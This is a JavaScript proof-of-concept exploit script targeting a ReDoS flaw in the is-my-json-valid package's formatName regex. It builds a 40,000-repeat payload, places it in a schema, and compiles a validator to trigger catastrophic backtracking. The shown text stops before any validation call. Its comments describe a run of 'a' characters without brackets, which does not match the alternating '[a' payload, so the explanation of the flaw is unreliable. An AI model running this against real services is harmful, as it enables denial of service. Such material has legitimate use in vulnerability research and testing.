  const isMyJsonValid = require('is-my-json-valid');

  // Payload crafted to exceed the backtracking limit of 30,000 in formatName's regex.
  // The vulnerable regex /\[([^\[\]"]+)\]/ greedily consumes characters that are not 
  // brackets or quotes. When fed a long sequence starting with '[' followed by many 
  // 'a' characters (which satisfy the negated class but lack a closing ']'), the 
  // engine attempts to match from each '[' position, consuming as many 'a's as possible,
  // then backtracks one character at a time until it finds an invalid state or succeeds.
  // With '[a'.repeat(40000), partial matches and subsequent backtracks easily surpass 30,000 steps.
  const redosPayload = '[a'.repeat(40000);

  const schema = {
    type: 'object',
    properties: {
      [redosPayload]: {
        type: 'string'
      }
    },
    required: [redosPayload]
  };

  console.log('🚀 Triggering ReDoS in is-my-json-valid/formatName...');
  const start = Date.now();

  // Compiling the schema and running validation forces error path formatting,
  // which invokes formatName() on the property name during failure reporting.
  const validate = isMyJsonValid(schema);

  // Feeding an incomplete object triggers a validation failure, which routes 
  // through the reporter/error formatter to formatName(prop) for path construction.
